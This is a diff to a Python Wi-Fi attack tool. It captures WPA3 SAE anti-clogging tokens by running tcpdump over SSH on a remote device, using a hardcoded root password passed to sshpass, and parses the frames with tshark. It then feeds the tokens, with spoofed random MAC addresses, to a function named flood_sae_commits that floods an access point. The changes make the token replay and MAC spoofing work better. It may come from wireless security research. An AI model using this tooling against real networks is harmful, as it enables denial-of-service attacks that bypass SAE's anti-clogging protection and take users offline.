@@ -15,25 +15,33 @@ pcap = None
 
 stop_track = threading.Event()
 lock = threading.Lock()
+
+
+
 def _track_cookie():
     global cookie_queue
+
+    #keep track of mac addresses
+    #we do not want to resent mac that has already been processed
+    seen_macs = set()
+
     track_cmd = ["sshpass", "-p", "halow", "ssh", "root@10.42.0.1", "tcpdump", "-i", "morse0", "-u", "-s0", "-w", "-", "# LIVE_TOKEN_TRACKER"]
 
-    buf = subprocess.Popen(track_cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE,bufsize=1024)
-
+    buf = subprocess.Popen(track_cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE,bufsize=4096)
+    
     tshark = subprocess.Popen(
         [
             "tshark",
             "-r", "-",
             "-Y", "wlan.fixed.anti_clogging_token",
-            "-T", "ek"
+            "-T", "ek",
+            "-l"
         ],
         stdin=buf.stdout,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         text=True
     )
-
     stdout = tshark.stdout
     # loop through the output of stdout
 
@@ -45,6 +53,7 @@ def _track_cookie():
             continue
         
         packet = json.loads(line)
+        
 
         random_mac = None
         ap_mac = None
@@ -55,12 +64,14 @@ def _track_cookie():
                 random_mac = packet["layers"]["wlan"]["wlan_wlan_ra"]
             if "wlan_wlan_mgt" in packet["layers"]:
                 cookie = bytes.fromhex(packet["layers"]["wlan_wlan_mgt"]["wlan_wlan_fixed_anti_clogging_token"].replace(":",""))
-
         if random_mac is not None and cookie is not None and ap_mac is not None:
-            cookie_queue.put((ap_mac,random_mac,cookie))
-            #frame_bytes = commit_frame(target_mac=ap_mac, src_mac=random_mac,cookie=cookie)
-            #transmitData(frame_bytes)
+            if random_mac not in seen_macs:
+                seen_macs.add(random_mac)
+                cookie_queue.put((ap_mac,random_mac,cookie))
 
+        #periodically clear seen macs
+        if len(seen_macs) > 10000:
+            seen_macs.clear()
 
     #terminate subprocesses
     tshark.terminate()
@@ -74,8 +85,9 @@ def random_mac():
     
     return: random string of mac addresses
     """
-    mac = [0x02 | random.randint(0, 1)] + [random.randint(0, 255) for _ in range(5)]
-    return ':'.join(f'{b:02x}' for b in mac)
+    first = (random.randint(0, 255) | 0x02) & ~0x01  # local + unicast
+    rest = [random.randint(0, 255) for _ in range(5)]
+    return ':'.join(f'{b:02x}' for b in [first] + rest)
 
 def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16):
     """
